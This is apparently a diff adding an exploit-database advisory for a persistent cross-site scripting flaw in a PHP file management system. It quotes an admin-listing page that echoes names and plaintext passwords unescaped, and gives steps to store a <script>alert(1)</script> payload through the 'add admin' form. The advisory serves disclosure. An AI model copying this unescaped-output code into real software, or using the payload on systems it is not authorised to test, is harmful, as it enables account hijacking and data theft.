@@ -1,0 +1,45 @@
+# Exploit Title: File Management System 1.1 - Persistent Cross-Site Scripting
+# Date: 2020-06-30
+# Exploit Author: KeopssGroup0day,Inc
+# Vendor Homepage:  https://www.sourcecodester.com/download-code?nid=13333&title=File+Management+System+Very+Complete+Using+PHP%2FMySQLi+version+1.1
+# Software Link:  https://www.sourcecodester.com/download-code?nid=13333&title=File+Management+System+Very+Complete+Using+PHP%2FMySQLi+version+1.1
+# Version: 0.1.0
+# Tested on: Kali Linux
+
+Source code(view_admin.php.php):
+<?php
+require_once("include/connection.php");
+$query="SELECT * FROM admin_login";
+$result=mysqli_query($conn,$query);
+while($rs=mysqli_fetch_array($result)){
+$id =  $rs['id'];
+$fname=$rs['name'];
+$admin=$rs['admin_user'];
+$pass=$rs['admin_password'];
+$status=$rs['admin_status'];
+?>
+<tr>
+  <td width='10%'><?php echo $fname; ?></td>
+  <td align='center'><?php echo $admin; ?></td>
+  <td align='center' width="20%"><?php echo $pass; ?></td>
+  <td align='center'><?php echo $status; ?></td>
+  <td align='center'><a href="#modalRegisterFormsss?id=<?php echo 
+$id;?>">
+  <i class="fas fa-user-edit" data-toggle="modal" 
+data-target="#modalRegisterFormsss"></i> </a> | <a 
+href="delete_admin.php?id=<?php echo htmlentities($rs['id']); ?>"><i 
+class='far fa-trash-alt'></i></a></td>
+</tr>
+<?php  } ?>
+
+POC:
+
+1. http://192.168.1.58/Private_Dashboard/view_admin.php
+
+2. Add admin click button
+
+3. We write payload in the name section (<script>alert(1);</script>)
+
+4. And view admin click button
+
+5. And our bad payload will be displayed
